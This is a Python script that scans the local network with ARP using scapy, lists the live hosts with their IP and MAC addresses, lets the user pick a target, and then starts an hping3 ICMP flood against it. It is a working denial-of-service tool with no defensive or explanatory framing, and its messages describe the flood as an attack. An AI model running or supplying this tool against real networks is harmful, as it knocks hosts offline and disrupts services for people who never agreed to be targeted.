#!/usr/bin/env python3

import scapy.all as scapy
import subprocess
import sys
import time
import os
import threading
import socket
import re

def in_sudo_mode():
    """Ensure script is run as root."""
    if not 'SUDO_UID' in os.environ:
        print("Please run this program with sudo.")
        exit()

def get_interface_ip(interface):
    """Get the IP address of a given interface."""
    try:
        output = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
        match = re.search(r"inet (\d+\.\d+\.\d+)\.\d+/\d+", output)
        if match:
            base_ip = match.group(1)
            return f"{base_ip}.0/24"
    except Exception as e:
        print(f"Error getting IP for {interface}: {e}")
        exit()

def arp_scan(ip_range):
    """ARP scan the network and return list of live hosts."""
    arp_responses = []
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
    for res in answered_lst:
        arp_responses.append({"ip": res[1].psrc, "mac": res[1].hwsrc})
    return arp_responses

def get_interface_names():
    """List all network interface names."""
    return os.listdir("/sys/class/net")

def print_arp_res(arp_res):
    """Display detected hosts and get user selection."""
    print("\nID\t\tIP Address\t\tMAC Address")
    print("-" * 50)
    for id, res in enumerate(arp_res):
        print(f"{id}\t\t{res['ip']}\t\t{res['mac']}")
    while True:
        try:
            choice = int(input("\nSelect target ID to start ICMP flood (Ctrl+C to exit): "))
            if 0 <= choice < len(arp_res):
                return arp_res[choice]['ip']
        except KeyboardInterrupt:
            print("\nUser exited.")
            exit()
        except:
            print("Invalid choice. Try again.")

def run_hping3(target_ip):
    """Run hping3 ICMP flood on target IP."""
    print(f"\nStarting ICMP flood on {target_ip} using hping3...\n")
    try:
        subprocess.run(["sudo", "hping3", "--icmp", "--flood", target_ip])
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        exit()
    except Exception as e:
        print(f"Error running hping3: {e}")
        exit()

# --- Main Execution ---

in_sudo_mode()

# Auto-select main interface (skips lo and docker interfaces)
interfaces = [iface for iface in get_interface_names() if iface not in ["lo", "docker0"]]

# Prefer wlan0 if available
if "wlan0" in interfaces:
    main_iface = "wlan0"
elif interfaces:
    main_iface = interfaces[0]
else:
    print("No valid network interface found.")
    exit()


# Get IP range from interface
ip_range = get_interface_ip(main_iface)
print(f"\n[*] Scanning network on interface '{main_iface}' with range {ip_range}")

# Run ARP scan
arp_res = arp_scan(ip_range)
if not arp_res:
    print("No live hosts found.")
    exit()

# Let user choose target
target_ip = print_arp_res(arp_res)

# Launch ICMP flood
run_hping3(target_ip)
